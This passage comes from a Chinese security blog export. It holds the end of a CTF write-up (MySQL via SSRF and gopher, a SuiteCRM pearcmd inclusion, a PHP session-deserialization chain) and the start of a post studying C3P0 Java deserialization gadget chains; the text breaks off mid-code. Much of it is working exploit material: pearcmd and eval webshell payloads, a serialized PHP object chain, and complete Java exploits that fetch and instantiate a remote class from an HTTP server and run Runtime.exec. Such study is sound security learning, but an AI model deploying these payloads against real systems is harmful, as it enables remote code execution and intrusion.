<p>getpicture.php接口有ssrf,但是过滤了file,etc,dict等字符串<br>http/gopher协议探测没有6379redis端口,查3306有mysql<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422002406.png" alt="image.png"></p>
<p>打mysql未授权:<br>用Gopherus工具生成payload:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422002549.png" alt="image.png"><br>需要把_后面的字符串进行url编码:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422002628.png" alt="image.png"><br>尝试写木马发现写不了没权限<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422002533.png" alt="image.png"></p>
<p>,那就直接读文件:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;/flag&#x27;);</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422002850.png" alt="image.png"></p>
<h2 id="SuiteCRM"><a href="#SuiteCRM" class="headerlink" title="SuiteCRM"></a>SuiteCRM</h2><p>有CVE: <a href="https://fluidattacks.com/advisories/silva/">https://fluidattacks.com/advisories/silva/</a><br>无法上次图片,但是有文件包含点,直接pearcmd<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php//usr/local/lib/php/pearcmd.php?+config-create+/&lt;?=eval($_POST[1])?&gt;+/tmp/evil.php</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422011011.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422011022.png" alt="image.png"></p>
<h2 id="web1234"><a href="#web1234" class="headerlink" title="web1234"></a>web1234</h2><p><code>/www.zip</code>有源码泄露<br>简单的session反序列化,挺有意思的<br>就三个类,有个backdoor参数可以执行无参函数<br>首先解码admin的密码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">resetconf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//返回出厂设置</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;/tmp/Config&quot;</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;Tzo2OiJDb25maWciOjc6e3M6NToidW5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjMyOiI1MGI5NzQ4Mjg5OTEwNDM2YmZkZDM0YmRhN2IxYzlkOSI7czo2OiJhdmF0YXIiO3M6MTA6Ii90bXAvMS5wbmciO3M6ODoibmlja25hbWUiO3M6MTU6IuWwj+eGiui9r+ezlk92TyI7czozOiJzZXgiO3M6Mzoi5aWzIjtzOjQ6Im1haWwiO3M6MTU6ImFkbWluQGFkbWluLmNvbSI7czo2OiJ0ZWxudW0iO3M6MTE6IjEyMzQ1Njc4OTAxIjt9&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>base64解码:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;Config&quot;:7:&#123;s:5:&quot;uname&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:32:&quot;50b9748289910436bfdd34bda7b1c9d9&quot;;s:6:&quot;avatar&quot;;s:10:&quot;/tmp/1.png&quot;;s:8:&quot;nickname&quot;;s:15:&quot;小熊软糖OvO&quot;;s:3:&quot;sex&quot;;s:3:&quot;女&quot;;s:4:&quot;mail&quot;;s:15:&quot;admin@admin.com&quot;;s:6:&quot;telnum&quot;;s:11:&quot;12345678901&quot;;&#125;</span><br></pre></td></tr></table></figure><br>md5解密<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422202329.png" alt="image.png"><br>执行phpinfo():<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?uname=admin&amp;passwd=1q2w3e&amp;backdoor=phpinfo</span><br></pre></td></tr></table></figure><br>寻找session的php处理器<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422202448.png" alt="image.png"></p>
<p>格式是键名+竖线+经过 serialize（） 函数反序列处理的值<br>链子:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Config</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$avatar</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$telnum</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Log</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$res</span>=<span class="keyword">new</span> <span class="title class_">Config</span>();</span><br><span class="line"><span class="variable">$sink</span>=<span class="keyword">new</span> <span class="title class_">Log</span>();</span><br><span class="line"><span class="variable">$sink</span>-&gt;data=<span class="string">&quot;log_start()&quot;</span>;</span><br><span class="line"><span class="variable">$res</span>-&gt;avatar=<span class="variable">$sink</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>);</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;Config&quot;:7:&#123;s:5:&quot;uname&quot;;N;s:6:&quot;passwd&quot;;N;s:6:&quot;avatar&quot;;O:3:&quot;Log&quot;:1:&#123;s:4:&quot;data&quot;;s:11:&quot;log_start()&quot;;&#125;s:8:&quot;nickname&quot;;N;s:3:&quot;sex&quot;;N;s:4:&quot;mail&quot;;N;s:6:&quot;telnum&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422202649.png" alt="image.png"></p>
<p>本地docker调试:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422202724.png" alt="image.png"><br>首先序列化初始化函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422202742.png" alt="image.png"><br>wakeup有后门无参函数,这里我们用session_start()来反序列化/tmp下的sess_xxx文件<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422202829.png" alt="image.png"><br>可以发现此时已经有了sess_jmx文件,它是空的<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422202910.png" alt="image.png"><br>然后获取我们提交的表单,进入editconf函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422202940.png" alt="image.png"><br>先进入upload函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422203000.png" alt="image.png"><br>它的作用是将我们提交的avator值写入对应/tmp/avator名字文件里<br>此时我们cat /tmp/sess_jmx<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422203053.png" alt="image.png"><br>成功写入恶意序列化数据<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422203113.png" alt="image.png"><br>然后进入Config的<strong>sleep魔术方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422203135.png" alt="image.png"><br>这里将我们写入的内容base64加密以图片方式返回<br>我们第二次发包,内容和第一次一样,第二次会反序列化sess_jmx数据,但是会先调用sleep魔术方法(也不知道啥机制)<br>先进入config的</strong>sleep方法:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422203343.png" alt="image.png"><br>进入showconf()<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422203408.png" alt="image.png"><br>然后进入Log的toString()<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422203426.png" alt="image.png"><br>给record.php写内容<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422203654.png" alt="image.png"></p>
<p>然后我们第三次发包,只改文件名为木马<code>1&#39;;eval($_POST[1]);#</code><br>cookie需要改下: <code>Cookie: PHPSESSID=jmx123;</code>,因为我们不需要反序列化sess_jmx文件的数据,如果那样的话会再写一次<code>&lt;?php\nerror_reporting(0);\n</code><br>因为我们这次可以直接进入Log.log()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422203825.png" alt="image.png"></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422203853.png" alt="image.png"><br>我们构造的文件名在初始化函数会拼接,闭合前面单引号,注释后面<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_1713788177 = &#x27;Edit: avatar-&gt;/tmp/1&#x27;;eval($_POST[1]);#, nickname-&gt;, sex-&gt;武装直升机, mail-&gt;, telnum-&gt;&#x27;;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422203947.png" alt="image.png"><br>最后RCE<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422204057.png" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/uuzeray/article/details/138003846">https://blog.csdn.net/uuzeray/article/details/138003846</a></p>
]]></content>
      <categories>
        <category>CTF比赛wp</category>
      </categories>
      <tags>
        <tag>CTF比赛wp</tag>
      </tags>
  </entry>
  <entry>
    <title>C3P0链子学习总结</title>
    <url>/2024/04/24/C3P0%E9%93%BE/</url>
    <content><![CDATA[<h3 id="URLClassLoader链"><a href="#URLClassLoader链" class="headerlink" title="URLClassLoader链"></a>URLClassLoader链</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="PoolBackedDataSourceBase入口链"><a href="#PoolBackedDataSourceBase入口链" class="headerlink" title="PoolBackedDataSourceBase入口链"></a>PoolBackedDataSourceBase入口链</h4><p>sink点在ReferenceableUtils.referenceToObject()方法里面有类加载器加载恶意类<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240423221319.png" alt="image.png"></p>
<p>一直查找用法:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PoolBackedDataSourceBase.readObject()-&gt;ReferenceIndirector.getObject()-&gt;ReferenceableUtils.referenceToObject()-&gt;</span><br></pre></td></tr></table></figure></p>
<p>我们查看<code>PoolBackedDataSourceBase.readObject()</code>方法,发现会判断o是否是IndirectlySerialized的对象或子类,是才调用getObject()方法,然后强制转化为ConnectionPoolDataSource类型的对象再进行一次判断是否调用getObejct()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240423221514.png" alt="image.png"><br>而ConnectionPoolDataSource是一个接口,没用实现Serialize,不能被序列化<br>我们看PoolBackedDataSourceBase的writeObject()方法:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240423222155.png" alt="image.png"><br>先判断是否可以序列化,不能就新建一个ReferenceIndirector对象,并调用ReferenceIndirector的indirectForm()方法来处理<code>connectionPoolDataSource</code>变量<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240423222317.png" alt="image.png"><br>getReference()方法会新建一个Reference对象<br>然后返回一个ReferenceSerialized对象<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240423222441.png" alt="image.png"><br>这个IndirectlySerialized接口是继承Serializable的,可以被序列化,而且也是readObject入口点需要的对象类型,满足条件,所以我们要通过反射来修改PoolBackedDataSourceBase的connectionPoolDataSource变量为我们的恶意变量</p>
<p>重点:</p>
<ul>
<li><p>我们需要知道connectionPoolDataSource变量是ConnectionPoolDataSource类型的,需要恶意类要重写它的方法,因为在反射的时候需要赋值,而ConnectionPoolDataSource又是继承CommonDataSource的,因此也要重写CommonDataSource的方法</p>
</li>
<li><p>恶意类还要继承Referenceable,因为在writeObject()方法的时候调用 ReferenceIndirector的indirectForm()方法,有一个强制转换成Referenceable类型<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240423231331.png" alt="image.png"></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:8002/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(ConnectionPoolDataSource lp) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">connectionPoolDataSourceField</span> <span class="operator">=</span> PoolBackedDataSourceBase.class.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        connectionPoolDataSourceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        connectionPoolDataSourceField.set(poolBackedDataSourceBase,lp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(poolBackedDataSourceBase);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">C3P0</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C3P0</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(exp);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>calc<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">calc</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>开http:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 8002</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240423222926.png" alt="image.png"></p>
<p>其他链子:<br>这里我们的入口点PoolBackedDataSourceBase具备以下条件:</p>
<ul>
<li>readObject()方法会调用可控类的getObject()方法</li>
<li>writeObject()方法会将一可控内置变量进行ReferenceIndirector.indirectForm()方法封装返回一个ReferenceSerialized对象<h4 id="JndiRefDataSourceBase入口链"><a href="#JndiRefDataSourceBase入口链" class="headerlink" title="JndiRefDataSourceBase入口链"></a>JndiRefDataSourceBase入口链</h4>我们查找这种类找到了JndiRefDataSourceBase<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240423223821.png" alt="image.png"><br>他writeObject写的是jndiName变量<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240423223855.png" alt="image.png"><br>readObject()正常调用getObject()<br>因此只需要修改入口类即可,其他保留上面一样的exp,因为jndiName变量是Object类型的对象,恶意类的重写方法可以不变,不影响<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(ConnectionPoolDataSource lp) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">JndiRefDataSourceBase</span> <span class="variable">JndiDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JndiRefDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">connectionPoolDataSourceField</span> <span class="operator">=</span> JndiRefDataSourceBase.class.getDeclaredField(<span class="string">&quot;jndiName&quot;</span>);</span><br><span class="line">    connectionPoolDataSourceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    connectionPoolDataSourceField.set(JndiDataSourceBase,lp);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240423224020.png" alt="image.png"></p>
<h4 id="WrapperConnectionPoolDataSourceBase入口链"><a href="#WrapperConnectionPoolDataSourceBase入口链" class="headerlink" title="WrapperConnectionPoolDataSourceBase入口链"></a>WrapperConnectionPoolDataSourceBase入口链</h4><p>它的writeObject处理的nestedDataSource变量,是<em>DataSource</em>类型,我们的恶意类需要重写<em>DataSource</em>接口和Referenceable接口的方法<br>又因为WrapperConnectionPoolDataSourceBase是抽象类,我们也需要额外构造一个子类继承它来实现<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.ConnectionCustomizer;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">wrap</span> <span class="keyword">extends</span> <span class="title class_">WrapperConnectionPoolDataSourceBase</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">wrap</span><span class="params">(<span class="type">boolean</span> autoregister)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(autoregister);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(ConnectionCustomizer cc, String idt)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password, ConnectionCustomizer cc, String idt)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> <span class="keyword">implements</span> <span class="title class_">Referenceable</span>, DataSource &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:8002/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">(String username, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> &lt;T&gt; T <span class="title function_">unwrap</span><span class="params">(Class&lt;T&gt; iface)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isWrapperFor</span><span class="params">(Class&lt;?&gt; iface)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 